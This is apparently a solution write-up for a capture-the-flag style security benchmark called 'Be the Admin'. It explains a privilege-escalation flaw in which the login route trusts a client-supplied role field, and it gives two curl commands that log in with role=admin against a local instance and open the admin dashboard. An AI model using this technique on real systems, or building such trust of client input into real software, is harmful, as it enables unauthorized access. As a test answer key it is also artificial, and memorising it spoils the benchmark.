# XBEN-089-24 — Be the Admin

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability:** Privilege escalation via client-controlled `role` parameter. `/login` validates
`username`/`password` against the DB but then blindly trusts the attacker-supplied `role` form
field to set `session['role']`, regardless of the authenticated account's actual `role` column.
`/admin/dashboard` only checks `session['role'] == 'admin'` — the "2FA" step (`/admin/2fa`, static
code `1234`) is cosmetic and never actually gates the dashboard or is checked server-side. So any
valid (even non-admin) account can gain admin access by simply sending `role=admin` at login.

Note: the shipped `app/users.db` already contains seed rows (differs from the `init_db()`
defaults, which only run once via `INSERT OR IGNORE`) — actual employee credentials are
`emp` / `password1` (not `emp` / `emppassword` as claimed in the challenge description).

## Exploit

```bash
# Log in as the employee account but request the "admin" role
curl -s -c cookies.txt -X POST http://localhost:55391/login \
  -d "username=emp&password=password1&role=admin"

# Session now has role=admin; fetch the admin dashboard directly
curl -s -b cookies.txt http://localhost:55391/admin/dashboard
```
